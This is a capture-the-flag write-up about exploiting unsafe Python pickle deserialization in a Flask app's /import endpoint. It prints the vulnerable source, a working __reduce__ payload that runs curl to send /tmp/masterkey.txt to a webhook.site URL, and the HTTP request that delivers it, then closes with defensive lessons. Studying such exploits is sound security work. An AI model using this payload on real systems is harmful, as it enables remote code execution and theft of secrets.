---
layout: post
title: "Pickle RCE: Exfiltrating Secrets via Unsafe Deserialization"
categories: code-review
tags:
  - rce
  - pickle
  - deserialization
  - flask
  - webhook
  - appsecmaster
pin: false
comments: true
toc: true
image: https://www.appsecmaster.net/assets/appLogo.svg
---
## Overview

This writeup covers a Remote Code Execution (RCE) vulnerability caused by **unsafe deserialization using Python's `pickle` module**.  
The vulnerable web application was featured in [AppSecMaster Challenge #82b24fdf](https://www.appsecmaster.net/en/challenge/82b24fdf-147a-4ef1-ac13-55f32861df3d), where the goal is to extract a sensitive file (`/tmp/masterkey.txt`) from the server.

---

## Vulnerability Summary

The Flask app allows importing base64-encoded state files via `/import`, which it deserializes using `pickle.loads()` directly on user input — opening the door to **arbitrary code execution** if an attacker crafts a malicious payload.

---

## Understanding the Bug

This part of the code is the root cause:

```python
decoded_data = base64.b64decode(base64_data)
program_state = pickle.loads(decoded_data)
````

Here, the server blindly trusts user-supplied input and loads it via `pickle`, a module known to allow arbitrary code execution when misused.

---

## Challenge Source Code

The full vulnerable Flask application:

```python
from flask import Flask, render_template, request, jsonify
import pickle
import os
import base64

app = Flask(__name__)
state_file = 'program_state.pkl'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save', methods=['POST'])
def save_state():
    try:
        program_state = request.json
        with open(state_file, 'wb') as f:
            pickle.dump(program_state, f)
        return jsonify({"message": "State saved successfully!"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/resume', methods=['GET'])
def resume_state():
    try:
        if not os.path.exists(state_file):
            return jsonify({"error": "No saved state found!"}), 404
        with open(state_file, 'rb') as f:
            program_state = pickle.load(f)
        return jsonify(program_state), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/import', methods=['POST'])
def import_statefile():
    try:
        base64_data = request.json.get('statefile')
        if not base64_data:
            return jsonify({"error": "No statefile data provided!"}), 400
        decoded_data = base64.b64decode(base64_data)
        program_state = pickle.loads(decoded_data)
        with open(state_file, 'wb') as f:
            pickle.dump(program_state, f)
        return jsonify({"message": "State imported and saved successfully!"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run()
```

---

## Exploitation Strategy

To exploit this, we define a custom class with a `__reduce__()` method that returns a callable and arguments to be executed when `pickle.loads()` is called.

I initially tried using:

```python
return (os.system, ("curl ...",))
```

But encountered the following error:

```
{"error": "No module named 'nt'"}
```

This happened because I built the payload on Windows, and `os.system` resolved internally to `nt.system`, which doesn't exist on Linux.

---

## The Final Payload

To solve the compatibility issue and reliably execute the command on Linux, I used `subprocess.getoutput()` instead.

```python
import pickle
import base64
import subprocess

class RCE:
    def __reduce__(self):
        return (
            subprocess.getoutput,
            ("curl 'https://webhook.site/your_link/leak?data='$(cat /tmp/masterkey.txt)",)
        )

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

This payload reads the contents of `/tmp/masterkey.txt` and sends it to my [webhook.site](https://webhook.site/) endpoint via a GET request.

---

## 📤 Sending the Payload

```http
POST /import HTTP/1.1
Host: target-website.com
Content-Type: application/json

{
  "statefile": "<base64_encoded_payload>"
}
```

Once the payload is deserialized by the server, it triggers the HTTP request with the leaked file content.

---

## Key Lessons

- **Never deserialize untrusted input with `pickle.loads()`**. Use safe alternatives like `json.loads()` unless you fully control the input.
    
- **RCE via deserialization** is one of the most dangerous classes of bugs and often leads to full server compromise or data leaks.
    
- **Cross-platform payload compatibility** matters. Avoid generating payloads on Windows when the target is Linux.
    

---
thanks for reading.
If you enjoyed this write-up, feel free to follow me on [Twitter](https://twitter.com/00xmora)